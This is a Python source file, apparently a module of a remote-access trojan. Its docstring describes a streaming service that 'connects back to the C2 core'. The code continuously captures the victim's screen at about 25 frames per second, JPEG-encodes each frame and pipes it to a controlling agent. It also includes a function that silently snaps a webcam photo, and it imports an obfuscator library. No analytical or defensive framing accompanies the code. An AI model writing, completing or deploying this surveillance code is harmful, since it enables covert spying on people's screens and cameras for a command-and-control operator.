import os, sys, time, threading, queue, socket, struct
import numpy as np
import cv2, mss

# Apex Modules: Internal Library access
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from lib.obfuscator import safe_json

class StreamHandler:
    """Independent Stream Handler using MSS for screen capture."""
    def __init__(self):
        try:
            self._sct = mss.mss()
            self.monitors = self._sct.monitors
        except:
            self._sct = None
            self.monitors = []
            
    def capture(self, mon_idx=0):
        if not self._sct: return None, None
        try:
            # Defensive monitor selection (fallback to monitor 0 if out of range)
            m_idx = mon_idx + 1
            if m_idx >= len(self.monitors): m_idx = 0
            
            mon = self.monitors[m_idx]
            img = self._sct.grab(mon)
            # Convert to BGR array for CV2
            return np.asanyarray(img)[..., :3], (img.width, img.height)
        except: return None, None

def streamer_service(host, port, mon_idx=0, quality=70):
    """Stand-alone streaming service that connects back to the C2 core."""
    handler = StreamHandler()
    while True:
        try:
            # MJPEG over UDP/TCP logic can go here for high-speed streaming
            # For now, we'll maintain compatibility with the core's WebSocket relay
            bgr, r = handler.capture(mon_idx)
            if bgr is not None:
                _, enc = cv2.imencode('.jpg', bgr, [cv2.IMWRITE_JPEG_QUALITY, quality])
                frame_data = enc.tobytes()
                # If run as worker, push to output stream
                sys.stdout.buffer.write(b'\x01' + frame_data)
                sys.stdout.buffer.flush()
            time.sleep(0.04) # ~25 FPS
        except: time.sleep(0.1)

async def webcam_snap():
    """Independent webcam snapshot utility."""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, enc = cv2.imencode('.jpg', frame)
            return enc.tobytes()
    except: return None

if __name__ == "__main__":
    # If run standalone, it will start the screen capture service
    # The Core agent will consume from the sub-process stdout
    streamer_service('127.0.0.1', 8000)
